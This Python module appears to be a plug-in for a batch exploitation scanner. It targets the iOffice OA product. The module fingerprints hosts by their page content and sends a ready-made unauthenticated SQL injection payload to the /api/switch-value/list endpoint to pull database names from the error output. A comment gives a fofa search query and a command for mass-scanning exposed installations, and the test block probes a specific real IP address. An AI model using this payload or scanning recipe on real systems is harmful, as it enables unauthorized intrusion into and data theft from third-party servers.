# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30


from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# fofa: app="ioffice"
# python3 batch.py -m exploit.scripts.OA.iOffice.unauth_sql_injection2 -cs -fs app="ioffice"


class Script(BaseScript):
    name = 'iOffice(红帆)'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.SQLINJECTION
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/api/switch-value/list?sorts=%5B%7B%22Field%22:%22convert(int,stuff((select%20quotename(name)%20from%20sys.databases%20for%20xml%20path(%27%27),1,0,%27%27))%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c5c89905a7)']
        # 相关信息
        self.info = ''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detectPath in self.detect_path_list:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detectPath}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'iOffice.net' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and '错误的请求' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} switch-value SqlInjection'.format(self.name), 'url': self.target, 'software': self.name}


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
